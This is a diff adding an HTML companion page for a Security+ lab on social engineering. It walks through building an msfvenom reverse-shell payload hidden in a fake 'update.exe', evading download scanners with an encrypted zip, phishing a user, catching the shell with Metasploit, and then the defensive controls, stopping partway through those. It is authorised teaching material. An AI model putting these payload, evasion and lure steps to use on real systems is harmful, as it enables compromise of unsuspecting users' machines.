@@ -1,0 +1,742 @@
+<!DOCTYPE html>
+<html lang="en" data-course="secplus" data-lab="1" data-theme="dark">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+<title>Lab 01 Companion — Social Engineering Attack · Security+</title>
+<meta name="description" content="Student companion for Security+ Lab 01: an overview of the social-engineering attack chain, every command explained, where students get stuck, the defender's view, screenshots to submit, and how the lab maps to your Security+ modules.">
+<style>
+:root{
+  --font-scale:1;
+  --bg-0:#0b1220; --bg-1:#131c2e; --card:#1b2537; --card-2:#222e44;
+  --line:#33415c; --text:#e8edf5; --muted:#9fb0c9;
+  --brand:#4da3ff; --accent:#00e28a; --warn:#f5a524; --danger:#ff5c5c; --ok:#2fbf71;
+  --radius:14px; --pad:20px; --maxw:1040px;
+  --mono:ui-monospace,SFMono-Regular,Menlo,Consolas,"Liberation Mono",monospace;
+  --sans:Lato,"Segoe UI",system-ui,-apple-system,sans-serif;
+}
+html[data-theme="light"]{
+  --bg-0:#f4f7fb; --bg-1:#e9eef6; --card:#ffffff; --card-2:#f0f4fa;
+  --line:#cfd8e6; --text:#16202e; --muted:#5a6a80;
+  --brand:#1668c9; --accent:#0a8f5c; --warn:#a86400; --danger:#c22e2e; --ok:#1c7a4b;
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{font-size:calc(100% * var(--font-scale))}
+body{font-family:var(--sans);background:linear-gradient(160deg,var(--bg-0),var(--bg-1));
+  color:var(--text);line-height:1.65;-webkit-text-size-adjust:100%;min-height:100vh;
+  padding-top:env(safe-area-inset-top,0)}
+.container{max-width:var(--maxw);margin:0 auto;padding:var(--pad)}
+a{color:var(--brand)}
+.skip-link{position:absolute;left:-9999px;top:0;background:var(--brand);color:#00121f;
+  padding:10px 16px;border-radius:0 0 8px 0;z-index:200}
+.skip-link:focus{left:0}
+:focus-visible{outline:3px solid var(--accent);outline-offset:2px}
+.sr-only{position:absolute;width:1px;height:1px;padding:0;margin:-1px;overflow:hidden;
+  clip:rect(0,0,0,0);white-space:nowrap;border:0}
+
+/* ---------- crumb + control bar ---------- */
+.topbar{display:flex;flex-wrap:wrap;gap:8px;align-items:center;padding:10px 0;margin-bottom:6px}
+.crumb{margin-right:auto;font-size:.85rem;color:var(--muted);display:inline-flex;align-items:center;gap:6px}
+.crumb a{text-decoration:none;font-weight:600}
+.crumb a:hover{text-decoration:underline}
+.ctl{display:inline-flex;align-items:center;gap:6px;font:inherit;font-size:.85rem;
+  min-height:44px;padding:8px 14px;cursor:pointer;background:var(--card);
+  color:var(--text);border:1px solid var(--line);border-radius:10px}
+.ctl:hover{background:var(--card-2)}
+.ctl:disabled{opacity:.45;cursor:not-allowed}
+.ctl__icon{font-family:var(--mono);font-weight:700}
+.ctl-group{display:inline-flex;align-items:center;gap:4px;background:var(--card);
+  border:1px solid var(--line);border-radius:10px;padding:2px}
+.ctl-group .ctl{border:none;background:none;min-width:44px;justify-content:center}
+.ctl-group output{font-size:.8rem;color:var(--muted);min-width:48px;text-align:center}
+
+/* ---------- header / hero ---------- */
+.module-header{background:var(--card);border:1px solid var(--line);border-radius:var(--radius);
+  padding:28px;margin-bottom:18px}
+.module-header .eyebrow{color:var(--accent);font-weight:700;letter-spacing:.08em;
+  text-transform:uppercase;font-size:.78rem}
+.module-header h1{font-size:clamp(1.5rem,3.4vw,2.4rem);line-height:1.2;margin-top:4px}
+.module-header .subtitle{color:var(--muted);margin-top:10px;max-width:72ch}
+.chips{display:flex;flex-wrap:wrap;gap:8px;margin-top:16px}
+.meta-chip{font-size:.82rem;background:var(--card-2);border:1px solid var(--line);
+  border-radius:99px;padding:7px 13px;color:var(--muted)}
+.meta-chip b{color:var(--text);font-weight:700}
+
+/* ---------- progress ---------- */
+.progress-container{background:var(--card);border:1px solid var(--line);border-radius:var(--radius);
+  padding:14px 18px;margin-bottom:18px}
+.progress-track{height:10px;background:var(--bg-0);border-radius:99px;overflow:hidden}
+.progress-bar{height:100%;width:0;border-radius:99px;
+  background:linear-gradient(90deg,var(--brand),var(--accent));transition:width .3s ease}
+.progress-text{font-size:.85rem;color:var(--muted);margin-top:8px}
+
+/* ---------- jump nav ---------- */
+.section-nav{display:flex;flex-wrap:wrap;gap:8px;margin-bottom:22px}
+.nav-btn{font:inherit;font-size:.88rem;min-height:44px;padding:9px 15px;cursor:pointer;
+  text-decoration:none;display:inline-flex;align-items:center;gap:7px;
+  background:var(--card);color:var(--text);border:1px solid var(--line);border-radius:10px}
+.nav-btn:hover{background:var(--card-2)}
+.nav-btn .done{color:var(--accent);font-weight:700;font-family:var(--mono);display:none}
+.nav-btn.is-done .done{display:inline}
+
+/* ---------- sections ---------- */
+.lab-section{background:var(--card);border:1px solid var(--line);border-radius:var(--radius);
+  padding:24px;margin-bottom:18px;scroll-margin-top:16px}
+.section-title{font-size:clamp(1.2rem,2.3vw,1.7rem);margin-bottom:6px;
+  display:flex;align-items:center;gap:10px}
+.section-title .ico{font-size:1.1em}
+.section-lead{color:var(--muted);margin-bottom:16px;max-width:74ch}
+.subsection{margin:24px 0}
+.subsection h3{font-size:1.12rem;margin-bottom:10px;color:var(--accent)}
+.lab-section p + p{margin-top:10px}
+.lab-section ul,.lab-section ol{margin:10px 0 10px 22px}
+.lab-section li{margin:6px 0}
+.phase-tag{display:inline-block;font-family:var(--mono);font-size:.72rem;font-weight:700;
+  letter-spacing:.06em;text-transform:uppercase;color:var(--brand);
+  background:color-mix(in srgb,var(--brand) 12%,transparent);
+  border:1px solid color-mix(in srgb,var(--brand) 40%,transparent);
+  border-radius:6px;padding:3px 9px;margin-bottom:6px}
+
+/* ---------- code / terminal ---------- */
+.code-block{font-family:var(--mono);font-size:.86rem;background:#070c16;color:#e8edf5;
+  border:1px solid var(--line);border-radius:10px;padding:14px 16px;overflow-x:auto;
+  white-space:pre-wrap;margin:10px 0;line-height:1.55}
+.code-block .cmt{color:var(--muted)}
+.code-block .pr{color:var(--accent)}
+code.inl{font-family:var(--mono);font-size:.88em;background:var(--card-2);
+  border:1px solid var(--line);border-radius:5px;padding:1px 6px}
+
+/* ---------- step explainer ---------- */
+.step{border-left:3px solid var(--line);padding:2px 0 2px 16px;margin:16px 0}
+.step h4{font-size:1rem;margin-bottom:4px}
+.step .why{font-size:.92rem;color:var(--muted);margin-top:6px}
+
+/* ---------- callouts ---------- */
+.callout{border-radius:10px;padding:14px 16px;margin:14px 0;border-left:5px solid var(--brand);
+  background:color-mix(in srgb,var(--brand) 10%,transparent)}
+.callout .tag{font-family:var(--mono);font-size:.74rem;font-weight:700;letter-spacing:.06em;
+  display:block;margin-bottom:4px;color:var(--brand)}
+.callout.warn{border-left-color:var(--warn);background:color-mix(in srgb,var(--warn) 12%,transparent)}
+.callout.warn .tag{color:var(--warn)}
+.callout.danger{border-left-color:var(--danger);background:color-mix(in srgb,var(--danger) 12%,transparent)}
+.callout.danger .tag{color:var(--danger)}
+.callout.ok{border-left-color:var(--ok);background:color-mix(in srgb,var(--ok) 12%,transparent)}
+.callout.ok .tag{color:var(--ok)}
+
+/* ---------- screenshot marker ---------- */
+.shot-mark{display:flex;gap:10px;align-items:flex-start;margin:12px 0;padding:11px 14px;
+  border-radius:10px;border:1px dashed color-mix(in srgb,var(--accent) 55%,transparent);
+  background:color-mix(in srgb,var(--accent) 8%,transparent);font-size:.9rem}
+.shot-mark .cam{font-size:1.1rem;line-height:1.3}
+.shot-mark b{color:var(--accent)}
+
+/* ---------- defender grid ---------- */
+.def-grid{display:grid;gap:14px;grid-template-columns:repeat(auto-fit,minmax(260px,1fr));margin-top:6px}
+.def-card{background:var(--card-2);border:1px solid var(--line);
+  border-left:4px solid var(--brand);border-radius:10px;padding:15px}
+.def-card h4{font-size:.98rem;margin-bottom:6px}
+.def-card .attack{font-size:.82rem;color:var(--muted);margin-bottom:8px}
+.def-card .ctrl{font-size:.9rem}
+
+/* ---------- figure / topology ---------- */
+.figure{margin:16px 0;background:var(--bg-0);border:1px solid var(--line);
+  border-radius:var(--radius);padding:18px}
+.figure svg{width:100%;height:auto;display:block;overflow:visible}
+.figure figcaption{margin-top:10px;font-size:.84rem;color:var(--muted);text-align:center}
+.svg-box{fill:var(--card-2);stroke:var(--line);stroke-width:1.5}
+.svg-label{fill:var(--text);font-family:var(--sans);font-size:13px;font-weight:700}
+.svg-sub{fill:var(--muted);font-family:var(--mono);font-size:10.5px}
+.svg-zone{fill:none;stroke-width:1.5;stroke-dasharray:5 4}
+
+/* ---------- evidence checklist ---------- */
+.evidence li{list-style:none;display:flex;gap:11px;align-items:flex-start;margin:10px 0;
+  padding:11px 13px;background:var(--card-2);border:1px solid var(--line);border-radius:9px}
+.evidence ul{margin-left:0}
+.evidence input[type=checkbox]{width:20px;height:20px;margin-top:2px;flex:none;accent-color:var(--accent)}
+.evidence .shot{color:var(--accent);font-weight:700}
+.evidence li:has(input:checked){border-color:var(--ok);background:color-mix(in srgb,var(--ok) 10%,transparent)}
+
+/* ---------- cheat sheet ---------- */
+.cheat{display:grid;gap:16px;grid-template-columns:repeat(auto-fit,minmax(260px,1fr))}
+.cheat .col{background:var(--card-2);border:1px solid var(--line);border-radius:10px;padding:16px}
+.cheat h4{color:var(--accent);font-size:.98rem;margin-bottom:8px}
+.cheat ul{margin-left:18px}
+.cheat code{font-family:var(--mono);font-size:.84em}
+
+/* ---------- review questions ---------- */
+.q{border:1px solid var(--line);border-radius:10px;padding:15px;margin:12px 0;background:var(--card-2)}
+.q .ask{font-weight:600;margin-bottom:10px}
+.reveal{font:inherit;font-size:.86rem;font-weight:600;min-height:40px;padding:8px 14px;cursor:pointer;
+  color:var(--text);background:var(--card);border:1px solid var(--line);border-radius:9px}
+.reveal:hover{border-color:var(--accent);color:var(--accent)}
+.ans{margin-top:10px;padding:12px 14px;border-radius:8px;font-size:.92rem;display:none;
+  background:color-mix(in srgb,var(--accent) 9%,transparent);border-left:4px solid var(--accent)}
+.ans.on{display:block}
+
+/* ---------- mark reviewed ---------- */
+.review{display:inline-flex;align-items:center;gap:9px;margin-top:18px;padding:9px 14px;cursor:pointer;
+  font-size:.9rem;font-weight:600;background:var(--card-2);border:1px solid var(--line);border-radius:10px}
+.review input{width:18px;height:18px;accent-color:var(--accent)}
+.review:has(input:checked){border-color:var(--ok);color:var(--ok)}
+
+/* ---------- footer / toast ---------- */
+.module-footer{margin-top:26px;padding-top:16px;border-top:1px solid var(--line);
+  color:var(--muted);font-size:.85rem;text-align:center}
+.toast{position:fixed;right:20px;bottom:20px;max-width:min(92vw,360px);
+  background:var(--card);border:1px solid var(--accent);color:var(--text);
+  padding:12px 18px;border-radius:10px;z-index:200;display:none;
+  box-shadow:0 10px 30px rgba(0,0,0,.35);font-size:.88rem;font-weight:600}
+.toast.on{display:block}
+
+@media (max-width:640px){
+  .container{padding:12px}
+  .module-header{padding:18px}
+  .nav-btn{flex:1 1 calc(50% - 8px)}
+  .topbar{justify-content:center}
+  .crumb{width:100%;margin-bottom:4px}
+}
+@media (prefers-reduced-motion:reduce){*{transition:none!important;animation:none!important}}
+@media print{
+  .topbar,.section-nav,.toast,.review{display:none!important}
+  body{background:#fff}
+  .lab-section,.module-header,.progress-container{break-inside:avoid}
+}
+
+/* ---------- related labs ---------- */
+.related{display:grid;gap:12px;grid-template-columns:repeat(auto-fit,minmax(240px,1fr))}
+.rel-card{display:flex;flex-direction:column;gap:3px;background:var(--card-2);border:1px solid var(--line);
+  border-left:4px solid var(--brand);border-radius:10px;padding:13px 15px;text-decoration:none;color:var(--text)}
+.rel-card:hover{border-left-color:var(--accent)}
+.rel-no{font-family:var(--mono);font-size:.7rem;font-weight:700;letter-spacing:.07em;color:var(--muted)}
+.rel-ttl{font-weight:700;font-size:.96rem}
+.rel-why{font-size:.84rem;color:var(--muted)}
+</style>
+</head>
+<body>
+<a class="skip-link" href="#main">Skip to main content</a>
+<div class="container">
+
+  <div class="topbar" role="group" aria-label="Display controls">
+    <span class="crumb"><a href="index.html">&larr; All labs</a> &middot; pairs with
+      <a href="index.html">the Security+ textbook</a></span>
+    <button class="ctl" id="themeToggle" type="button" data-action="toggleTheme" aria-pressed="true">
+      <span class="ctl__icon" aria-hidden="true">🌙</span><span class="ctl__text">Dark</span>
+    </button>
+    <div class="ctl-group" role="group" aria-label="Text size">
+      <button class="ctl" id="fontDec" type="button" data-action="fontDec" aria-label="Decrease text size"><span class="ctl__icon">A−</span></button>
+      <output id="fontSizeValue" for="fontDec fontInc">100%</output>
+      <button class="ctl" id="fontInc" type="button" data-action="fontInc" aria-label="Increase text size"><span class="ctl__icon">A+</span></button>
+    </div>
+    <button class="ctl" type="button" data-action="print"><span class="ctl__icon" aria-hidden="true">🖨</span><span class="ctl__text">Print</span></button>
+    <button class="ctl" type="button" data-action="resetProgress"><span class="ctl__icon" aria-hidden="true">🔄</span><span class="ctl__text">Reset</span></button>
+  </div>
+
+  <header class="module-header">
+    <p class="eyebrow">Security+ Lab Companion &middot; Lab 01</p>
+    <h1>Social Engineering Attack</h1>
+    <p class="subtitle">The firewall blocks every inbound connection to the intranet — so the attacker never tries one. Instead a person inside is tricked into running a file that dials <em>out</em>. This companion walks the whole chain, explains each command, and shows how a defender breaks it at every link.</p>
+    <div class="chips">
+      <span class="meta-chip">⏱ <b>45–60 min</b></span>
+      <span class="meta-chip">📶 Difficulty: <b>Intermediate</b></span>
+      <span class="meta-chip">🧰 Tools: <b>msfvenom · mingw-w64 · msfconsole</b></span>
+      <span class="meta-chip">🎯 Target: <b>WinOS 192.168.0.50 (behind pfSense)</b></span>
+      <span class="meta-chip">📘 Maps to: <b>Module 3 — Threat Actors &amp; Attack Surfaces</b></span>
+    </div>
+  </header>
+
+  <div class="callout danger">
+    <span class="tag">[AUTHORIZED TESTING ONLY]</span>
+    Every technique here is taught for defensive understanding and runs inside an isolated NETLAB+ pod. Building malware, sending lure emails, or opening a remote shell on a machine you do not own or have written permission to test is a crime in most jurisdictions.
+  </div>
+
+  <div class="progress-container">
+    <div class="progress-track">
+      <div class="progress-bar" id="progressBar" role="progressbar" aria-valuenow="0" aria-valuemin="0" aria-valuemax="100" aria-label="Companion progress"></div>
+    </div>
+    <p class="progress-text" id="progressText">0% · mark each section reviewed as you work through it</p>
+  </div>
+
+  <nav class="section-nav" id="sectionNav" aria-label="Jump to section">
+    <a class="nav-btn" href="#overview" data-nav="overview"><span class="done" aria-hidden="true">✓</span>📋 Overview</a>
+    <a class="nav-btn" href="#walkthrough" data-nav="walkthrough"><span class="done" aria-hidden="true">✓</span>🧭 Walkthrough</a>
+    <a class="nav-btn" href="#stuck" data-nav="stuck"><span class="done" aria-hidden="true">✓</span>⚠️ Where students get stuck</a>
+    <a class="nav-btn" href="#defender" data-nav="defender"><span class="done" aria-hidden="true">✓</span>🛡️ Defender's view</a>
+    <a class="nav-btn" href="#evidence" data-nav="evidence"><span class="done" aria-hidden="true">✓</span>📸 Evidence</a>
+    <a class="nav-btn" href="#cheat" data-nav="cheat"><span class="done" aria-hidden="true">✓</span>⚡ Cheat sheet</a>
+    <a class="nav-btn" href="#check" data-nav="check"><span class="done" aria-hidden="true">✓</span>✅ Check yourself</a>
+    <a class="nav-btn" href="#related" data-nav="related">🔗 Related labs</a>
+  </nav>
+
+  <main id="main">
+
+    <!-- ================= OVERVIEW ================= -->
+    <section class="lab-section" id="overview" data-section="overview">
+      <h2 class="section-title"><span class="ico" aria-hidden="true">📋</span> Overview</h2>
+      <p class="section-lead">What this lab is really teaching, and the network it happens on.</p>
+
+      <p>On paper this lab is a hacking exercise. The point it's actually making is a defensive one: <strong>a perimeter firewall only controls the direction of the first packet.</strong> The intranet machine (WinOS, <code class="inl">192.168.0.50</code>) sits behind a pfSense firewall that silently drops anything arriving from the internet. The attacker on Kali (<code class="inl">203.0.113.2</code>) can't reach it — a ping just times out. So the attacker doesn't attack the firewall. They email a person inside and let that person launch a program that opens a connection <em>outward</em>, which the firewall happily allows. That outbound connection becomes the attacker's way in.</p>
+
+      <div class="figure">
+        <svg viewBox="0 0 760 300" role="img" aria-labelledby="topo-title topo-desc">
+          <title id="topo-title">Lab topology</title>
+          <desc id="topo-desc">Kali on the internet is blocked inbound by the pfSense firewall, but the WinOS victim on the LAN opens an outbound reverse shell back to Kali, which the firewall permits.</desc>
+          <!-- zones -->
+          <rect class="svg-zone" x="12" y="40" width="150" height="150" rx="10" style="stroke:var(--danger)"/>
+          <text class="svg-sub" x="20" y="58" style="fill:var(--danger)">WAN · INTERNET</text>
+          <rect class="svg-zone" x="300" y="40" width="160" height="150" rx="10" style="stroke:var(--warn)"/>
+          <text class="svg-sub" x="308" y="58" style="fill:var(--warn)">DMZ</text>
+          <rect class="svg-zone" x="588" y="40" width="160" height="150" rx="10" style="stroke:var(--accent)"/>
+          <text class="svg-sub" x="596" y="58" style="fill:var(--accent)">LAN · INTRANET</text>
+
+          <!-- nodes -->
+          <rect class="svg-box" x="30" y="80" width="114" height="70" rx="8"/>
+          <text class="svg-label" x="87" y="108" text-anchor="middle">Kali</text>
+          <text class="svg-sub" x="87" y="128" text-anchor="middle">203.0.113.2</text>
+          <text class="svg-sub" x="87" y="142" text-anchor="middle">attacker</text>
+
+          <rect class="svg-box" x="205" y="92" width="70" height="46" rx="8" style="stroke:var(--brand);stroke-width:2"/>
+          <text class="svg-sub" x="240" y="112" text-anchor="middle" style="fill:var(--brand);font-weight:700">pfSense</text>
+          <text class="svg-sub" x="240" y="126" text-anchor="middle">firewall</text>
+
+          <rect class="svg-box" x="318" y="80" width="124" height="70" rx="8"/>
+          <text class="svg-label" x="380" y="104" text-anchor="middle">UbuntuSRV</text>
+          <text class="svg-sub" x="380" y="122" text-anchor="middle">172.16.1.10</text>
+          <text class="svg-sub" x="380" y="136" text-anchor="middle">mail server</text>
+
+          <rect class="svg-box" x="606" y="80" width="124" height="70" rx="8"/>
+          <text class="svg-label" x="668" y="104" text-anchor="middle">WinOS</text>
+          <text class="svg-sub" x="668" y="122" text-anchor="middle">192.168.0.50</text>
+          <text class="svg-sub" x="668" y="136" text-anchor="middle">victim</text>
+
+          <!-- inbound blocked -->
+          <line x1="144" y1="105" x2="203" y2="105" stroke="var(--danger)" stroke-width="2"/>
+          <text x="150" y="98" class="svg-sub" style="fill:var(--danger)">ping ✗</text>
+          <line x1="168" y1="94" x2="180" y2="116" stroke="var(--danger)" stroke-width="2.5"/>
+          <line x1="180" y1="94" x2="168" y2="116" stroke="var(--danger)" stroke-width="2.5"/>
+
+          <!-- reverse shell outbound, curving LAN -> Kali -->
+          <path d="M 668 160 L 668 230 L 87 230 L 87 150" fill="none" stroke="var(--accent)" stroke-width="2.5" marker-end="url(#arr)"/>
+          <defs><marker id="arr" markerWidth="10" markerHeight="10" refX="7" refY="3" orient="auto"><path d="M0,0 L7,3 L0,6 Z" fill="var(--accent)"/></marker></defs>
+          <text x="360" y="223" class="svg-sub" style="fill:var(--accent);font-weight:700">reverse shell dials OUT (TCP 4444) — firewall allows it</text>
+        </svg>
+        <figcaption>Inbound is blocked; the compromise travels on an outbound connection the firewall never thinks to question.</figcaption>
+      </div>
+
+      <div class="callout">
+        <span class="tag">[THE ONE IDEA]</span>
+        If you remember one thing: <strong>egress (outbound) traffic is a security boundary too.</strong> A reverse shell is the whole reason "we have a firewall" is not the same as "we are safe."
+      </div>
+
+      <h3 style="color:var(--accent);margin-top:20px">The chain in four moves</h3>
+      <ol>
+        <li><strong>Build</strong> a Windows payload with msfvenom, embed it in a C++ program, cross-compile to <code class="inl">update.exe</code>, and hide it in a password-protected zip so the download scanner can't read it.</li>
+        <li><strong>Lure</strong> — from a compromised mail account, send a convincing "please update your software" email with a link to the file.</li>
+        <li><strong>Listen</strong> — start a Metasploit handler on Kali, waiting for the shell to call home.</li>
+        <li><strong>Land</strong> — the victim runs the file; a session opens on Kali with a foothold inside the intranet.</li>
+      </ol>
+
+      <label class="review"><input type="checkbox" data-review="overview"> Mark this section reviewed</label>
+    </section>
+
+    <!-- ================= WALKTHROUGH ================= -->
+    <section class="lab-section" id="walkthrough" data-section="walkthrough">
+      <h2 class="section-title"><span class="ico" aria-hidden="true">🧭</span> The walkthrough</h2>
+      <p class="section-lead">Every command the lab has you run, what it actually does, and the options that matter. Watch for the 📸 markers — those are the moments worth a screenshot.</p>
+
+      <div class="subsection">
+        <span class="phase-tag">Phase 1 · Build the payload</span>
+        <h3>Generate shellcode and compile a Windows executable</h3>
+
+        <div class="step">
+          <h4>Inspect the carrier program</h4>
+          <div class="code-block"><span class="pr">kali@kali$</span> cd Documents
+<span class="pr">kali@kali$</span> cat main.cpp</div>
+          <p class="why">A half-finished C++ program is waiting for you. It has two blanks: a place for the shellcode bytes and a place for their length. The visible part prints a fake "updating…" message so the victim sees something harmless while the payload runs behind it.</p>
+        </div>
+
+        <div class="step">
+          <h4>Generate the shellcode</h4>
+          <div class="code-block"><span class="pr">kali@kali$</span> msfvenom -p windows/x64/shell_reverse_tcp LHOST=203.0.113.2 LPORT=4444 -f c</div>
+          <p class="why">This is the heart of the lab. <code class="inl">-p windows/x64/shell_reverse_tcp</code> picks a 64-bit payload that opens a shell <em>back</em> to the attacker. <code class="inl">LHOST</code> is where it calls home (Kali), <code class="inl">LPORT</code> the port it knocks on. <code class="inl">-f c</code> formats the raw bytes as a C array you can paste into the program. Note the <strong>byte count</strong> msfvenom prints (the lab's example is 460) — you'll need it in a moment.</p>
+          <div class="shot-mark"><span class="cam">📸</span><span><b>Screenshot for your report:</b> the msfvenom output showing the payload and its byte count.</span></div>
+        </div>
+
+        <div class="step">
+          <h4>Paste the payload and match the length</h4>
+          <div class="code-block"><span class="pr">kali@kali$</span> sudo nano -l main.cpp   <span class="cmt"># -l shows line numbers; password is kali</span></div>
+          <p class="why">Paste the copied bytes onto line 5, and set the length field to the same number msfvenom reported. Copy/paste inside the terminal is <code class="inl">Ctrl+Shift+C</code> / <code class="inl">Ctrl+Shift+V</code> — the Shift matters. If the byte count and the array don't agree, the program compiles but the shell never connects.</p>
+        </div>
+
+        <div class="step">
+          <h4>Cross-compile to a Windows .exe</h4>
+          <div class="code-block"><span class="pr">kali@kali$</span> x86_64-w64-mingw32-g++ main.cpp -o update.exe</div>
+          <p class="why">Kali is Linux, but the target is Windows — so you compile <em>for</em> Windows using the mingw-w64 cross-compiler. The output, <code class="inl">update.exe</code>, is a real Windows binary built on Linux.</p>
+        </div>
+
+        <div class="step">
+          <h4>Wrap it to survive the download</h4>
+          <div class="code-block"><span class="pr">kali@kali$</span> zip -e update.zip update.exe   <span class="cmt"># password: xyzsecurity</span></div>
+          <p class="why">An encrypted zip is the evasion step. Browser and Defender download scanners can't look inside an encrypted archive, so the EXE isn't flagged or deleted on arrival. The victim has to type the password to extract it — which is exactly what the social-engineering email tells them to do.</p>
+        </div>
+
+        <div class="step">
+          <h4>Serve the file</h4>
+          <div class="code-block"><span class="pr">kali@kali$</span> python3 -m http.server</div>
+          <p class="why">A throwaway web server on port 8000 so the email can link to the file. Leave it running.</p>
+        </div>
+      </div>
+
+      <div class="subsection">
+        <span class="phase-tag">Phase 2 · The lure</span>
+        <h3>Prove the target is unreachable, then email your way in</h3>
+
+        <div class="step">
+          <h4>Confirm the firewall is doing its job</h4>
+          <div class="code-block"><span class="pr">kali@kali$</span> ping -c4 192.168.0.50</div>
+          <p class="why">Four packets, zero replies. This failure is the point — it proves you cannot reach the intranet directly. Everything after this is about getting <em>around</em> that, not through it.</p>
+          <div class="shot-mark"><span class="cam">📸</span><span><b>Screenshot for your report:</b> the failed ping (100% packet loss) to 192.168.0.50.</span></div>
+        </div>
+
+        <div class="step">
+          <h4>Send from the compromised account</h4>
+          <p class="why">Log into the stolen webmail account (<code class="inl">tech@mail.netlab.local</code>) and compose a message to the victim, <code class="inl">wsmith@mail.netlab.local</code>, subject <em>"Please update your software."</em> Switch the editor to HTML, type the lure, and hyperlink the word <strong>HERE</strong> to your hosted <code class="inl">update.zip</code>. The email looks like routine IT housekeeping — that's the whole trick. Send it.</p>
+          <div class="shot-mark"><span class="cam">📸</span><span><b>Screenshot for your report:</b> the composed email with the HERE link, before sending.</span></div>
+        </div>
+      </div>
+
+      <div class="subsection">
+        <span class="phase-tag">Phase 3 · Listen</span>
+        <h3>Start a handler to catch the connection</h3>
+
+        <div class="step">
+          <h4>Open Metasploit and load the handler</h4>
+          <div class="code-block"><span class="pr">kali@kali$</span> msfconsole
+<span class="pr">msf6&gt;</span> use exploit/multi/handler
+<span class="pr">msf6 exploit(multi/handler)&gt;</span> set payload windows/x64/shell_reverse_tcp
+<span class="pr">msf6 exploit(multi/handler)&gt;</span> set LHOST 203.0.113.2
+<span class="pr">msf6 exploit(multi/handler)&gt;</span> exploit</div>
+          <p class="why">The <code class="inl">multi/handler</code> is a catcher — its only job is to receive a shell. The payload here <strong>must match</strong> the one you built (64-bit <code class="inl">shell_reverse_tcp</code>); the handler defaults to a generic 32-bit payload that won't line up, which is why you set it explicitly. <code class="inl">LHOST</code> must be Kali's address so the listener binds correctly. <code class="inl">exploit</code> starts listening. (Tip: <code class="inl">setg LHOST …</code> sets it globally so you don't repeat it.)</p>
+          <div class="shot-mark"><span class="cam">📸</span><span><b>Screenshot for your report:</b> the handler reporting "Started reverse TCP handler."</span></div>
+        </div>
+      </div>
+
+      <div class="subsection">
+        <span class="phase-tag">Phase 4 · Land</span>
+        <h3>The victim runs the file; you get a shell</h3>
+        <p>On the WinOS machine you play the victim (Will Smith): open the webmail, read the email, click <strong>HERE</strong>, and push the download past the browser's "can't be downloaded securely" warning (Keep → Keep anyway). Extract <code class="inl">update.zip</code> with the password <code class="inl">xyzsecurity</code>, and run <code class="inl">update.exe</code>, clicking through the Defender SmartScreen warning. Each of those warnings is a control the lab deliberately overrides so you can see what the attacker is counting on the user to ignore.</p>
+        <p>Back on Kali, the handler reports a new session. Confirm your foothold:</p>
+        <div class="code-block"><span class="pr">C:\&gt;</span> whoami
+<span class="pr">C:\&gt;</span> ipconfig    <span class="cmt"># 192.168.0.50 — you're inside the intranet, behind the firewall</span>
+<span class="pr">C:\&gt;</span> hostname</div>
+        <div class="shot-mark"><span class="cam">📸</span><span><b>Screenshot for your report:</b> the opened session plus <code class="inl">whoami</code> / <code class="inl">ipconfig</code> showing 192.168.0.50.</span></div>
+      </div>
+
+      <label class="review"><input type="checkbox" data-review="walkthrough"> Mark this section reviewed</label>
+    </section>
+
+    <!-- ================= STUCK ================= -->
+    <section class="lab-section" id="stuck" data-section="stuck">
+      <h2 class="section-title"><span class="ico" aria-hidden="true">⚠️</span> Where students get stuck</h2>
+      <p class="section-lead">The handful of places this lab quietly fails — and how to tell which one bit you.</p>
+
+      <div class="callout warn"><span class="tag">[BYTE COUNT MISMATCH]</span>
+        The number on line 5's length field must equal the byte count msfvenom printed (e.g. 460). If they disagree, the EXE builds fine but the shell never comes back. Re-check this first whenever "nothing happens."</div>
+
+      <div class="callout warn"><span class="tag">[WRONG PAYLOAD ON THE HANDLER]</span>
+        The handler defaults to <code class="inl">generic/shell_reverse_tcp</code>, a 32-bit catcher that can't handle your 64-bit payload. You must <code class="inl">set payload windows/x64/shell_reverse_tcp</code> explicitly. A connection that opens and instantly dies is the tell.</div>
+
+      <div class="callout warn"><span class="tag">[COPY/PASTE IN THE TERMINAL]</span>
+        It's <code class="inl">Ctrl+Shift+C</code> and <code class="inl">Ctrl+Shift+V</code> in a Linux terminal, not plain Ctrl+C/V (plain Ctrl+C sends an interrupt). Pasting into <code class="inl">nano</code> can also mangle long lines — paste exactly on line 5.</div>
+
+      <div class="callout warn"><span class="tag">[LHOST / LPORT DON'T AGREE]</span>
+        The payload's <code class="inl">LHOST</code>/<code class="inl">LPORT</code> (set at build time) and the handler's must be identical. Mix up the Kali address or the port and the shell dials a number nobody's answering.</div>
+
+      <div class="callout warn"><span class="tag">[THE ZIP PASSWORD]</span>
+        Extraction needs <code class="inl">xyzsecurity</code>. If Defender deleted the EXE, you almost certainly skipped the <code class="inl">-e</code> (encrypt) flag when zipping — the plain EXE gets scanned and quarantined on download.</div>
+
+      <div class="callout warn"><span class="tag">[CLICKING THROUGH THE WARNINGS]</span>
+        The browser's "can't be downloaded securely" and Defender's SmartScreen prompt both try to stop you. You have to choose Keep anyway / Run. If the file never executes, you probably dismissed one of these instead of overriding it.</div>
+
+      <label class="review"><input type="checkbox" data-review="stuck"> Mark this section reviewed</label>
+    </section>
+
+    <!-- ================= DEFENDER ================= -->
+    <section class="lab-section" id="defender" data-section="defender">
+      <h2 class="section-title"><span class="ico" aria-hidden="true">🛡️</span> The defender's view</h2>
+      <p class="section-lead">This is a defensive course, so run the attack backwards: every step above is a control that was missing. Here's what stops each one — and which Security+ ideas each control belongs to.</p>
+
+      <div class="def-grid">
+        <div class="def-card">
+          <h4>Egress filtering</h4>
+          <p class="attack">Breaks: the reverse shell (Phase 3–4)</p>
+          <p class="ctrl">The single highest-value control here. If the firewall restricts <em>outbound</em> traffic to known services, a host dialing out to <code class="inl">203.0.113.2:4444</code> is blocked and logged. Perimeter rules that only filter inbound leave this door wide open.</p>
+        </div>
+        <div class="def-card">
+          <h4>Email security gateway</h4>
+          <p class="attack">Breaks: the lure (Phase 2)</p>
+          <p class="ctrl">Attachment/link detonation, blocking password-protected archives, and an external-sender banner all intercept the message. The encrypted zip that fooled the download scanner is itself a red flag a mail gateway can quarantine.</p>
+        </div>
+        <div class="def-card">
+          <h4>Security awareness training</h4>
+          <p class="attack">Breaks: the human (Phase 2 &amp; 4)</p>
+          <p class="ctrl">The whole attack depends on one person running an emailed "update." Users who recognize the lure, distrust unsolicited software, and report it short-circuit the chain before any control is tested.</p>
+        </div>
+        <div class="def-card">
+          <h4>Application allow-listing</h4>
